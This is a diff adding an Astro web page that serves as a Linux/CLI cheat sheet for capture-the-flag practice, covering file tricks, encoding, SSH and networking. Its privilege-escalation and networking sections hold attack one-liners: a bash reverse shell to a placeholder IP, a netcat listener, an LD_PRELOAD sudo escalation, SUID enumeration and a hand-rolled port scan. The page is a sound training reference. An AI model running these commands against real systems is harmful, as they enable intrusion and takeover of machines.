@@ -1,0 +1,145 @@
+---
+import BaseHead from '../../components/BaseHead.astro';
+import Footer from '../../components/Footer.astro';
+import Header from '../../components/Header.astro';
+import { SITE_TITLE } from '../../consts';
+---
+
+<!doctype html>
+<html lang="en">
+	<head>
+		<BaseHead title={`Linux / CLI Cheat Sheet | ${SITE_TITLE}`} description="Linux and CLI CTF quick reference." />
+	</head>
+	<body>
+		<Header />
+		<main>
+			<div class="breadcrumb"><a href="/posts">Posts</a> / Cheat Sheets / Linux</div>
+			<h1>Linux / CLI Cheat Sheet</h1>
+
+			<section>
+				<h2>File Tricks</h2>
+				<pre><code># Read files
+cat /etc/passwd
+cat -v file               # show non-printable chars
+strings file | grep flag
+xxd file | grep -i flag
+
+# Find flags
+grep -r "flag{" /         2>/dev/null
+find / -name "flag*"      2>/dev/null
+find / -perm -4000        2>/dev/null   # SUID binaries
+
+# Hidden files
+ls -la
+find . -name ".*"</code></pre>
+			</section>
+
+			<section>
+				<h2>Bandit-Style Tricks</h2>
+				<pre><code># Read file with special name
+cat ./-          → cat -- -
+cat "spaces in name"
+cat spaces\ in\ name
+
+# Binary/encoded content
+base64 -d <<< "SGVsbG8="
+xxd -r -p hex.txt > binary
+rot13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+# Compressed layers
+file data.bin
+mv data.bin data.gz && gunzip data.gz
+tar -xf data.tar
+bzip2 -d data.bz2
+
+# Listening port
+nc localhost 30001
+openssl s_client -connect localhost:30001   # SSL</code></pre>
+			</section>
+
+			<section>
+				<h2>Privilege Escalation</h2>
+				<pre><code># Enum
+sudo -l                   # what can we sudo?
+id && whoami
+uname -a
+cat /etc/crontab
+env
+
+# SUID
+find / -perm -4000 2>/dev/null
+# Check GTFOBins for each binary
+
+# Writable paths in root cron
+ls -la /etc/cron*
+
+# Sudo + env
+sudo LD_PRELOAD=/tmp/evil.so program</code></pre>
+			</section>
+
+			<section>
+				<h2>Networking</h2>
+				<pre><code>nc -lvnp 4444              # listener
+nc TARGET 4444             # connect
+
+# Reverse shell (bash)
+bash -i >& /dev/tcp/IP/PORT 0>&1
+
+# Port scan (no nmap)
+for p in {1..1000}; do (echo >/dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "open: $p"; done
+
+# Transfer files
+python3 -m http.server 8000
+curl http://IP:8000/file -o file
+wget http://IP:8000/file</code></pre>
+			</section>
+
+			<section>
+				<h2>Encoding / Crypto</h2>
+				<pre><code>base64 -e / -d
+xxd / xxd -r -p
+echo "text" | md5sum
+openssl enc -aes-256-cbc -d -in enc.txt -k password
+
+# Caesar / ROT13
+python3 -c "import codecs; print(codecs.decode('CIPHER','rot_13'))"
+
+# CyberChef (web) — best for quick chaining</code></pre>
+			</section>
+
+			<section>
+				<h2>SSH</h2>
+				<pre><code>ssh user@host -p PORT
+ssh -i key.pem user@host
+# Fix key permissions
+chmod 600 key.pem
+
+# SSHFS (mount remote fs)
+sshfs user@host:/path /mnt/remote
+
+# Tunnel
+ssh -L 8080:localhost:80 user@host   # local forward
+ssh -D 1080 user@host                # SOCKS proxy</code></pre>
+			</section>
+		</main>
+		<Footer />
+	</body>
+</html>
+
+<style>
+	.breadcrumb { font-size: 0.8em; color: var(--text-muted); margin-bottom: 1.5em; }
+	.breadcrumb a { color: var(--accent); }
+	h1 { font-size: 1.5em; margin-bottom: 1.25em; }
+	h2 { font-size: 0.95em; font-weight: 600; margin: 1.75em 0 0.6em; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.06em; }
+	section { margin-bottom: 0.5em; }
+	pre {
+		background: var(--bg-secondary);
+		border: 1px solid var(--border);
+		border-radius: 6px;
+		padding: 1em 1.2em;
+		overflow-x: auto;
+		font-size: 0.82em;
+		line-height: 1.6;
+	}
+	code { font-family: 'Fira Code', 'Consolas', monospace; }
+</style>
